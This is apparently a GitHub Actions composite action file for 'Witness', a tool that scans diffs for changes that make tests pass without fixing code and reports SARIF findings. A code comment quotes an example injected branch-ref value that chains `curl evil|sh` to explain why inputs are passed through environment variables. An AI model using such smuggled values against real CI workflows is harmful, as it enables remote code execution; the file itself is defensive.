name: 'Witness — test integrity scan'
description: 'Find changes that make a check pass without making the code right. Advisory by default; uploads SARIF to GitHub code scanning.'
author: 'Ahmed Ben Daamer'
branding:
  icon: 'check-square'
  color: 'gray-dark'

inputs:
  base:
    description: 'Base ref to diff against. Defaults to the pull request base, or the previous commit on push.'
    required: false
    default: ''
  fail-on:
    description: >
      Comma-separated tells that should fail the job, e.g. "moved-goalpost,no-op-fix",
      or "any". Empty means advisory only, which is the default and the recommended
      starting point: run it for a few weeks and look at what it finds before gating on it.
    required: false
    default: ''
  level:
    description: 'SARIF level for findings: note, warning, or error.'
    required: false
    default: 'note'
  upload-sarif:
    description: 'Upload results to GitHub code scanning. Requires security-events: write.'
    required: false
    default: 'true'
  sarif-file:
    description: 'Where to write the SARIF file.'
    required: false
    default: 'witness.sarif'
  comment:
    description: 'Post a summary to the job summary page.'
    required: false
    default: 'true'

outputs:
  findings:
    description: 'Number of findings.'
    value: ${{ steps.scan.outputs.findings }}
  issues:
    description: 'Number of distinct issues, after grouping sites that are one decision.'
    value: ${{ steps.scan.outputs.issues }}
  tells:
    description: 'Comma-separated list of tells found.'
    value: ${{ steps.scan.outputs.tells }}
  status:
    description: 'clean or findings.'
    value: ${{ steps.scan.outputs.status }}

runs:
  using: composite
  steps:
    # Every value below reaches bash through env, never through ${{ }} inside the
    # script. A ${{ }} expression is pasted in as source text before a shell
    # exists, so `base` arriving as `x";curl evil|sh;"` would have executed —
    # and a caller passing github.event.pull_request.head.ref is both an
    # ordinary thing to write and attacker-controlled, because git allows ; $ `
    # and quotes in a branch name.
    - name: Resolve base ref
      id: base
      shell: bash
      env:
        INPUT_BASE: ${{ inputs.base }}
      run: |
        set -euo pipefail
        if [ -n "$INPUT_BASE" ]; then
          # A newline would let a ref write extra key=value pairs into
          # GITHUB_OUTPUT, which is the same trick one layer down.
          case $INPUT_BASE in
            *$'\n'*|*$'\r'*) echo "::error::witness: base ref must not contain newlines"; exit 1 ;;
          esac
          BASE="$INPUT_BASE"
        elif [ -n "${GITHUB_BASE_REF:-}" ]; then
          BASE="origin/${GITHUB_BASE_REF}"
        else
          BASE="${GITHUB_SHA}^"
        fi
        echo "ref=${BASE}" >> "$GITHUB_OUTPUT"
        echo "witness: diffing against ${BASE}"

    - name: Scan
      id: scan
      shell: bash
      env:
        WITNESS_BASE: ${{ steps.base.outputs.ref }}
        WITNESS_FAIL_ON: ${{ inputs.fail-on }}
        WITNESS_LEVEL: ${{ inputs.level }}
        WITNESS_SARIF: ${{ inputs.sarif-file }}
      run: |
        set -uo pipefail
        ARGS=(--base "$WITNESS_BASE" --level "$WITNESS_LEVEL" --sarif "$WITNESS_SARIF")
        [ -n "$WITNESS_FAIL_ON" ] && ARGS+=(--fail-on "$WITNESS_FAIL_ON")
        node "${GITHUB_ACTION_PATH}/bin/witness-scan.js" "${ARGS[@]}"
        SCAN_EXIT=$?

        # Read the same findings back as JSON for the outputs and summary. The
        # scan is cheap and pure, so running it twice is simpler than teaching
        # the CLI to emit two formats at once.
        #
        # The JSON is turned into outputs by a script rather than by inline
        # `node -e`, because inline shell in a YAML string is covered by no test:
        # the previous version took the length of a `findings` value that became
        # a plain number in 0.3.0, and printed "undefined finding(s)". See
        # scripts/action-outputs.js and tests/contract.test.js.
        node "${GITHUB_ACTION_PATH}/bin/witness-scan.js" --base "$WITNESS_BASE" --format json > witness.json || true
        node "${GITHUB_ACTION_PATH}/scripts/action-outputs.js" witness.json >> "$GITHUB_OUTPUT"
        echo "exit=${SCAN_EXIT}" >> "$GITHUB_OUTPUT"
        exit 0

    - name: Job summary
      if: inputs.comment == 'true'
      shell: bash
      env:
        WITNESS_BASE: ${{ steps.base.outputs.ref }}
        SCAN_STATUS: ${{ steps.scan.outputs.status }}
        SCAN_ISSUES: ${{ steps.scan.outputs.issues }}
        SCAN_FINDINGS: ${{ steps.scan.outputs.findings }}
        SCAN_TELLS: ${{ steps.scan.outputs.tells }}
      run: |
        set -uo pipefail
        {
          echo "### Witness — test integrity scan"
          echo
          if [ "$SCAN_STATUS" != "findings" ]; then
            echo "No tells found in this diff."
          else
            echo "**${SCAN_ISSUES} issue(s) across ${SCAN_FINDINGS} site(s):** \`${SCAN_TELLS}\`"
            echo
            echo '```'
            node "${GITHUB_ACTION_PATH}/bin/witness-scan.js" --base "$WITNESS_BASE" 2>/dev/null || true
            echo '```'
            echo
            echo "Every one of these has a legitimate version. If it is the right call here, keep it and add a \`witness: <why>\` comment on or next to the line — that silences the finding and records the decision."
          fi
        } >> "$GITHUB_STEP_SUMMARY"

    - name: Upload SARIF
      if: inputs.upload-sarif == 'true'
      uses: github/codeql-action/upload-sarif@v4
      with:
        sarif_file: ${{ inputs.sarif-file }}
        category: witness

    - name: Apply gate
      shell: bash
      env:
        SCAN_EXIT: ${{ steps.scan.outputs.exit }}
        INPUT_FAIL_ON: ${{ inputs.fail-on }}
      run: |
        if [ "$SCAN_EXIT" != "0" ]; then
          echo "::error::witness: findings matched fail-on (${INPUT_FAIL_ON})"
          exit 1
        fi
